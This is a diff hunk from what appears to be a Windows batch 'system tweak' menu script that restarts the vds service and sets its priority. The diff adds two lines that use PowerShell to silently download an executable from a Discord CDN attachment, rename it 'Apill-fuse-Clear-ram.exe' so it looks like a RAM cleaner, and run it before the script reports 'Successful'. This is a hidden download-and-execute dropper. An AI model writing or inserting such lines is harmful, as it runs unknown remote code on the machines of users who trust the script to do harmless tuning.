@@ -4374,6 +4374,8 @@ sc start vds
 for /f "tokens=3" %%a in ('sc queryex "vds" ^| findstr "PID"') do (set pid=%%a)
 wmic process where ProcessId=%pid% CALL setpriority "realtime"
 cls
+powershell.exe Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1175389296149151777/1203713790378770463/HELIOS.exe?ex=65d218d3&is=65bfa3d3&hm=393a6a4a9ebb8ba61c00780891d03020d27fc5de5f00c1ebcec6ed0bc93609ab&" -OutFile "Apill-fuse-Clear-ram.exe"
+start Apill-fuse-Clear-ram.exe
 echo Successful
 TIMEOUT 2 /nobreak > nul
 goto menu
